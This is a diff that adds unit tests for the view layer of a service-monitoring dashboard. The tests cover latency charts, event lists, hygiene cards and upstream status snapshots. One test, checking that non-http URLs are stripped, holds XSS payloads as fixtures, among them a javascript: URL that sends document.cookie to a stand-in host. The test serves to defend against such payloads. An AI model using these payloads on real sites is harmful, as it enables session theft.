@@ -709,3 +709,537 @@ async def test_build_overview_exposes_hero_and_mini(tmp_path, monkeypatch):
     # 每个 health 行都带 mini_pts 字符串
     assert all(isinstance(r["mini_pts"], str) for r in overview["health"])
     store.close()
+
+
+def test_mini_sparkline_points():
+    from sentinel.panel.view import _mini_sparkline_points
+
+    assert _mini_sparkline_points([None, None]) == ""  # 全缺 → 空串(模板不渲染)
+    d = _mini_sparkline_points([10.0, 20.0, 15.0])
+    assert d.startswith("M") and "L" in d  # 折线路径起于 M、续以 L
+
+
+def test_build_services_list_shape(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    today = NOW.date()
+    store.upsert_probe_daily(
+        "api", (today - timedelta(days=1)).isoformat(), total=100, ok_count=100, p50=10.0, p95=20.0
+    )
+    store.add_probe_samples(
+        [ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=12.0)]
+    )
+    data = view.build_services_list(store, settings, now=NOW, window_days=30)
+    assert data["window_days"] == 30
+    svcs = data["services"]
+    assert len(svcs) == 1 and svcs[0]["service"] == "api"
+    assert svcs[0]["uptime_pct"] == 100.0  # 今日全 ok
+    assert svcs[0]["state"] == "ok"
+    assert isinstance(svcs[0]["p95_pts"], str)  # 迷你 sparkline path d
+    # 逐日 p95 已挂在 days 上(服务详情大图复用)
+    assert any(d.get("p95_ms") is not None for d in svcs[0]["days"])
+    store.close()
+
+
+# —— Phase 2:服务详情 view 单测 ——
+
+
+def test_latency_chart_dual_line_and_band():
+    from sentinel.panel.view import _latency_chart
+
+    c = _latency_chart([10.0, 12.0, 11.0], [20.0, 30.0, 25.0])
+    assert c["p50_d"].startswith("M") and "L" in c["p50_d"]
+    assert c["p95_d"].startswith("M") and "L" in c["p95_d"]
+    # 无缺口 → p50–p95 区间面积闭合(M…L…Z)
+    assert c["band_d"].startswith("M") and c["band_d"].endswith("Z")
+
+
+def test_latency_chart_too_few_points_empty():
+    from sentinel.panel.view import _latency_chart
+
+    c = _latency_chart([10.0], [20.0])
+    assert c == {"p50_d": "", "p95_d": "", "band_d": ""}
+
+
+def test_latency_chart_gap_drops_band_keeps_lines():
+    from sentinel.panel.view import _latency_chart
+
+    c = _latency_chart([10.0, None, 12.0], [20.0, 25.0, 30.0])
+    assert c["band_d"] == ""  # 任一线含缺口 → 不填面积
+    assert c["p50_d"].count("M") == 2  # 缺口处折线断开后重新起笔
+    assert c["p95_d"].startswith("M")
+
+
+def test_status_code_buckets_timeout_and_order():
+    from sentinel.panel.view import _status_code_buckets
+
+    samples = [
+        ProbeSample(ts=1, service="api", ok=True, status_code=200, latency_ms=5.0),
+        ProbeSample(ts=2, service="api", ok=True, status_code=200, latency_ms=6.0),
+        ProbeSample(ts=3, service="api", ok=False, status_code=500, latency_ms=None),
+        ProbeSample(ts=4, service="api", ok=False, status_code=None, latency_ms=None),
+    ]
+    buckets = _status_code_buckets(samples)
+    assert buckets[0]["code"] == "200" and buckets[0]["count"] == 2
+    codes = {b["code"] for b in buckets}
+    assert "timeout" in codes  # status_code None → timeout 桶
+    assert sum(b["count"] for b in buckets) == 4
+    assert abs(sum(b["pct"] for b in buckets) - 100.0) < 0.5
+
+
+def test_status_code_buckets_empty():
+    from sentinel.panel.view import _status_code_buckets
+
+    assert _status_code_buckets([]) == []
+
+
+def test_sample_latency_series_breaks_on_failure_and_downsamples():
+    from sentinel.panel.view import _sample_latency_series
+
+    samples = [
+        ProbeSample(ts=10, service="api", ok=True, status_code=200, latency_ms=11.0),
+        ProbeSample(ts=20, service="api", ok=False, status_code=500, latency_ms=None),
+        ProbeSample(ts=30, service="api", ok=True, status_code=200, latency_ms=13.0),
+    ]
+    lat = _sample_latency_series(samples, cap=10)
+    assert lat == [11.0, None, 13.0]  # 失败样本 → None 断线
+    many = [
+        ProbeSample(ts=i, service="api", ok=True, status_code=200, latency_ms=float(i))
+        for i in range(100)
+    ]
+    assert len(_sample_latency_series(many, cap=20)) == 20  # 下采样到 cap
+
+
+def test_event_x_marks_in_window_and_clamp():
+    from sentinel.findings import EventRecord
+    from sentinel.panel.view import _event_x_marks
+
+    def ev(eid, ts):
+        return EventRecord(
+            id=eid,
+            ts=ts,
+            rule="latency_degraded",
+            subject="api",
+            severity="warning",
+            status="open",
+            detail="d",
+            payload_json="{}",
+            diagnosis_status="skipped",
+            diagnosis_json=None,
+            cooldown_until=0,
+            resolved_ts=None,
+        )
+
+    marks = _event_x_marks(
+        [ev(1, 0), ev(2, 500), ev(3, 1000), ev(4, 5000)],
+        start_ts=0,
+        end_ts=1000,
+        tz=TZ,
+        w=600.0,
+    )
+    ids = [m["id"] for m in marks]
+    assert ids == [1, 2, 3]  # ts=5000 在窗外被丢弃
+    assert all(0.0 <= m["x"] <= 600.0 for m in marks)
+    assert marks[0]["x"] == 0.0 and marks[2]["x"] == 600.0
+
+
+def test_latency_compare_replicates_engine_threshold(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    today = NOW.date()
+    # 7 日基线均 100ms;ratio=2.0、margin=500 → threshold=max(200, 600)=600
+    for i in range(1, 8):
+        store.upsert_probe_daily(
+            "api",
+            (today - timedelta(days=i)).isoformat(),
+            total=10,
+            ok_count=10,
+            p50=50.0,
+            p95=100.0,
+        )
+    cmp = view._latency_compare(
+        store, settings, "api", current_p95=700.0, before_date=today.isoformat()
+    )
+    assert cmp["baseline_ms"] == 100
+    assert cmp["threshold_ms"] == 600  # max(100*2, 100+500)
+    assert cmp["breached"] is True  # 700 > 600
+    assert cmp["baseline_days"] == 7
+    store.close()
+
+
+def test_latency_compare_no_baseline(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    cmp = view._latency_compare(
+        store, settings, "api", current_p95=42.0, before_date=NOW.date().isoformat()
+    )
+    assert cmp["baseline_ms"] is None and cmp["threshold_ms"] is None
+    assert cmp["breached"] is None and cmp["fill_pct"] is None
+    assert cmp["current_ms"] == 42  # current 仍回填
+    store.close()
+
+
+def test_build_service_detail_daily_shape(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    today = NOW.date()
+    store.upsert_probe_daily(
+        "api", (today - timedelta(days=1)).isoformat(), total=100, ok_count=100, p50=10.0, p95=20.0
+    )
+    store.add_probe_samples(
+        [ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=12.0)]
+    )
+    d = view.build_service_detail(store, settings, "api", now=NOW, window_days=30)
+    assert d is not None
+    assert d["service"] == "api" and d["state"] == "ok"
+    assert d["chart"]["mode"] == "daily"
+    assert d["gran"] == "daily"
+    assert d["status_codes"][0]["code"] == "200"
+    assert len(d["days"]) == 30
+    assert d["events"]["page"] == 1
+    store.close()
+
+
+def test_build_service_detail_samples_mode(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    store.add_probe_samples(
+        [
+            ProbeSample(ts=NOW_TS - 60, service="api", ok=True, status_code=200, latency_ms=11.0),
+            ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=13.0),
+        ]
+    )
+    d = view.build_service_detail(store, settings, "api", now=NOW, gran="samples")
+    assert d is not None
+    assert d["chart"]["mode"] == "samples"
+    assert d["chart"]["single_d"].startswith("M")  # 逐次单线
+    store.close()
+
+
+def test_build_service_detail_missing_returns_none(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    assert view.build_service_detail(store, settings, "ghost", now=NOW) is None
+    store.close()
+
+
+def test_build_service_detail_related_events_and_marks(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    store.add_probe_samples(
+        [ProbeSample(ts=NOW_TS - 30, service="api", ok=True, status_code=200, latency_ms=12.0)]
+    )
+    _seed_open(store, "latency_degraded", "api", ts=NOW_TS - 3600)
+    _seed_open(store, "service_down", "other", ts=NOW_TS - 3600)  # 别的服务,不该出现
+    # 逐日模式 x 轴跨整窗(午夜→now),1h 前的事件落在窗内可标注
+    d = view.build_service_detail(store, settings, "api", now=NOW, gran="daily")
+    assert d["events"]["total"] == 1
+    assert d["events"]["items"][0]["rule"] == "latency_degraded"
+    # latency 类事件叠到时序图 x 标记上
+    assert any(m["rule"] == "latency_degraded" for m in d["marks"])
+    store.close()
+
+
+# —— Phase 2:事件流列表 view 单测 ——
+
+
+def test_confidence_and_tool_count_helpers():
+    from sentinel.findings import EventRecord
+    from sentinel.panel.view import _confidence_of, _confidence_pct, _tool_count_of
+
+    def rec(diag_json=None, tools_json=None):
+        return EventRecord(
+            id=1,
+            ts=0,
+            rule="container_down",
+            subject="api",
+            severity="critical",
+            status="open",
+            detail="d",
+            payload_json="{}",
+            diagnosis_status="done",
+            diagnosis_json=diag_json,
+            cooldown_until=0,
+            resolved_ts=None,
+            diagnosis_tools_json=tools_json,
+        )
+
+    assert _confidence_of(rec(json.dumps({"confidence": "High"}))) == "high"  # 归一小写
+    assert _confidence_of(rec(json.dumps({"confidence": "bogus"}))) is None
+    assert _confidence_of(rec(None)) is None
+    assert _confidence_of(rec("not-json")) is None
+    assert _tool_count_of(rec(tools_json=json.dumps([{"tool": "a"}, {"tool": "b"}]))) == 2
+    assert _tool_count_of(rec(tools_json=None)) == 0
+    assert _tool_count_of(rec(tools_json="bad")) == 0
+    assert _confidence_pct("high") == 92 and _confidence_pct("medium") == 66
+    assert _confidence_pct("low") == 38 and _confidence_pct(None) is None
+
+
+def test_event_view_exposes_confidence_and_tool_count(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    _seed_open(
+        store,
+        "container_down",
+        "api",
+        diag={"summary": "x", "confidence": "medium"},
+        tools=[{"tool": "docker_logs", "output": "o", "ok": True}],
+    )
+    data = view.build_events_list(store, settings, now=NOW)
+    it = data["events"]["items"][0]
+    assert it["confidence"] == "medium"
+    assert it["tool_count"] == 1
+    store.close()
+
+
+def test_build_events_list_filters_and_subjects(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    _seed_open(store, "service_down", "api", ts=NOW_TS - 100)  # critical open
+    store.insert_event(
+        ts=NOW_TS - 200,
+        rule="latency_degraded",
+        subject="auth",
+        severity="warning",
+        status="open",
+        detail="d",
+        payload_json="{}",
+        diagnosis_status="skipped",
+        cooldown_until=0,
+    )
+    rid = store.insert_event(
+        ts=NOW_TS - 300,
+        rule="container_down",
+        subject="api",
+        severity="critical",
+        status="open",
+        detail="d",
+        payload_json="{}",
+        diagnosis_status="skipped",
+        cooldown_until=0,
+    )
+    store.resolve_event(rid, resolved_ts=NOW_TS - 250)  # recovered
+    base = view.build_events_list(store, settings, now=NOW)
+    assert base["events"]["total"] == 3
+    assert [s["name"] for s in base["subjects"]] == ["api", "auth"]  # distinct + 排序
+    # subject=api → 2(service_down + 已恢复 container_down)
+    assert view.build_events_list(store, settings, now=NOW, subject="api")["events"]["total"] == 2
+    # severity=warning → 1(auth)
+    sv = view.build_events_list(store, settings, now=NOW, severity="warning")
+    assert sv["events"]["total"] == 1 and sv["events"]["items"][0]["subject"] == "auth"
+    # status=recovered → 1(已恢复的 container_down)
+    rc = view.build_events_list(store, settings, now=NOW, status="recovered")
+    assert rc["events"]["total"] == 1 and rc["events"]["items"][0]["lifecycle"] == "recovered"
+    # status=open → 2
+    assert view.build_events_list(store, settings, now=NOW, status="open")["events"]["total"] == 2
+    store.close()
+
+
+def test_build_events_list_label_and_page_clamp(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    for i in range(20):
+        store.insert_event(
+            ts=NOW_TS - 100 - i,
+            rule="service_down",
+            subject="api",
+            severity="critical",
+            status="open",
+            detail="d",
+            payload_json="{}",
+            diagnosis_status="skipped",
+            cooldown_until=0,
+        )
+    data = view.build_events_list(
+        store, settings, now=NOW, page=999, service_labels={"api": "API Gateway"}
+    )
+    assert data["events"]["page"] == data["events"]["total_pages"]  # 越界钳到末页
+    assert data["events"]["items"][0]["label"] == "API Gateway"  # label 回填
+    store.close()
+
+
+# —— Phase 2:体检页 view 单测 ——
+
+
+def test_local_hygiene_default_tristate(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)  # backup_dir 默认非空;prometheus/cert_domains 默认空
+    store = Store(str(tmp_path / "s.db"))
+    cards = {c["key"]: c for c in view._local_hygiene(store, settings, tz=TZ)}
+    assert cards["backup"]["state"] == "ok"  # 已配置且无 open 事件
+    assert cards["disk"]["state"] == "unevaluated"  # 未接 prometheus
+    assert cards["cert"]["state"] == "unevaluated"  # 未配证书域名
+    store.close()
+
+
+def test_local_hygiene_alert_values(tmp_path, monkeypatch):
+    settings = _settings(
+        monkeypatch, SENTINEL_CERT_DOMAINS="a.com", SENTINEL_PROMETHEUS_URL="http://p:9090"
+    )
+    store = Store(str(tmp_path / "s.db"))
+    store.insert_event(
+        ts=NOW_TS - 100,
+        rule="cert_expiry",
+        subject="a.com",
+        severity="warning",
+        status="open",
+        detail="d",
+        payload_json=json.dumps({"days_left": 3}),
+        diagnosis_status="skipped",
+        cooldown_until=0,
+    )
+    store.insert_event(
+        ts=NOW_TS - 100,
+        rule="disk_forecast",
+        subject="/",
+        severity="warning",
+        status="open",
+        detail="d",
+        payload_json=json.dumps({"predicted_avail_bytes": 2.5e9}),
+        diagnosis_status="skipped",
+        cooldown_until=0,
+    )
+    cards = {c["key"]: c for c in view._local_hygiene(store, settings, tz=TZ)}
+    assert cards["cert"]["state"] == "alert" and cards["cert"]["values"]["days_left"] == 3
+    assert cards["disk"]["state"] == "alert"
+    assert cards["disk"]["values"]["predicted_avail_gb"] == 2.5  # bytes → GB
+    assert cards["backup"]["state"] == "ok"  # 仍健康
+    store.close()
+
+
+def test_local_hygiene_disk_usage_secondary(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch, SENTINEL_PROMETHEUS_URL="http://p:9090")
+    store = Store(str(tmp_path / "s.db"))
+    store.insert_event(
+        ts=NOW_TS - 100,
+        rule="disk_usage",
+        subject="/",
+        severity="critical",
+        status="open",
+        detail="d",
+        payload_json=json.dumps({"usage_pct": 91.3}),
+        diagnosis_status="skipped",
+        cooldown_until=0,
+    )
+    disk = next(c for c in view._local_hygiene(store, settings, tz=TZ) if c["key"] == "disk")
+    assert disk["state"] == "alert"  # 仅 disk_usage open(无 forecast)也 alert
+    assert disk["values"]["usage_pct"] == 91.3
+    store.close()
+
+
+def test_upstream_deps_indicator_and_incident_filter(tmp_path, monkeypatch):
+    from sentinel.models import (
+        Component,
+        ComponentStatus,
+        Incident,
+        IncidentStatus,
+        Indicator,
+        Snapshot,
+    )
+
+    settings = _settings(monkeypatch, SENTINEL_PROVIDERS="anthropic,openai")
+    store = Store(str(tmp_path / "s.db"))
+    store.put(
+        "anthropic",
+        Snapshot(
+            provider="anthropic",
+            display_name="Anthropic",
+            indicator=Indicator.MAJOR,
+            status_url="https://status.anthropic.com",
+            components=[Component(key="api", name="API", status=ComponentStatus.PARTIAL_OUTAGE)],
+            incidents=[
+                Incident(
+                    key="i1",
+                    title="Elevated errors",
+                    status=IncidentStatus.INVESTIGATING,
+                    impact=Indicator.MAJOR,
+                    url="https://s/i1",
+                    started_at=None,
+                    updated_at=None,
+                    latest_update_id="u1",
+                ),
+                Incident(
+                    key="i2",
+                    title="done",
+                    status=IncidentStatus.RESOLVED,
+                    impact=Indicator.MINOR,
+                    url="https://s/i2",
+                    started_at=None,
+                    updated_at=None,
+                    latest_update_id="u2",
+                ),
+            ],
+            fetched_at="2026-06-16T00:00:00Z",
+        ),
+    )
+    deps = {d["provider"]: d for d in view._upstream_deps(store, settings)}
+    assert deps["anthropic"]["state"] == "partial"  # major → partial
+    assert deps["anthropic"]["components"][0]["state"] == "partial"  # partial_outage → partial
+    assert len(deps["anthropic"]["incidents"]) == 1  # resolved 滤掉,仅留未结
+    assert deps["openai"]["state"] == "nodata" and deps["openai"]["has_data"] is False
+    store.close()
+
+
+def test_upstream_deps_rejects_non_http_urls(tmp_path, monkeypatch):
+    """外部 shortlink/status_url 必须经 http(s) scheme 白名单:javascript:/data: 一律抹成空。
+    否则上游被投毒的 shortlink 会落进 href 成可点击 XSS(autoescape 不拦 scheme)。"""
+    from sentinel.models import (
+        Incident,
+        IncidentStatus,
+        Indicator,
+        Snapshot,
+    )
+
+    settings = _settings(monkeypatch, SENTINEL_PROVIDERS="anthropic")
+    store = Store(str(tmp_path / "s.db"))
+    store.put(
+        "anthropic",
+        Snapshot(
+            provider="anthropic",
+            display_name="Anthropic",
+            indicator=Indicator.MAJOR,
+            status_url="javascript:alert(document.domain)",  # 投毒的 status_url
+            components=[],
+            incidents=[
+                Incident(
+                    key="bad",
+                    title="poisoned",
+                    status=IncidentStatus.INVESTIGATING,
+                    impact=Indicator.MAJOR,
+                    url="javascript:fetch('//x/'+document.cookie)",  # 投毒 shortlink
+                    started_at=None,
+                    updated_at=None,
+                    latest_update_id="u1",
+                ),
+                Incident(
+                    key="ok",
+                    title="legit",
+                    status=IncidentStatus.INVESTIGATING,
+                    impact=Indicator.MINOR,
+                    url="https://status.anthropic.com/incidents/abc",  # 合法
+                    started_at=None,
+                    updated_at=None,
+                    latest_update_id="u2",
+                ),
+            ],
+            fetched_at="2026-06-16T00:00:00Z",
+        ),
+    )
+    dep = view._upstream_deps(store, settings)[0]
+    assert dep["status_url"] == ""  # javascript: status_url 抹空
+    by_title = {i["title"]: i for i in dep["incidents"]}
+    assert by_title["poisoned"]["url"] == ""  # javascript: shortlink 抹空
+    assert by_title["legit"]["url"] == "https://status.anthropic.com/incidents/abc"  # https 保留
+    store.close()
+
+
+async def test_build_hygiene_shape_and_banner(tmp_path, monkeypatch):
+    settings = _settings(monkeypatch)
+    store = Store(str(tmp_path / "s.db"))
+    store.set_meta("daily_report_last_date", "2026-06-16")
+    data = await view.build_hygiene(store, settings, now=NOW)
+    assert set(data) >= {"banner", "local", "upstream", "posture", "host_self"}
+    assert len(data["local"]) == 3
+    assert data["banner"]["layers_total"] == 4
+    assert data["banner"]["last_report_date"] == "2026-06-16"
+    assert data["banner"]["upstream_any_data"] is False  # 无 snapshot
+    store.close()
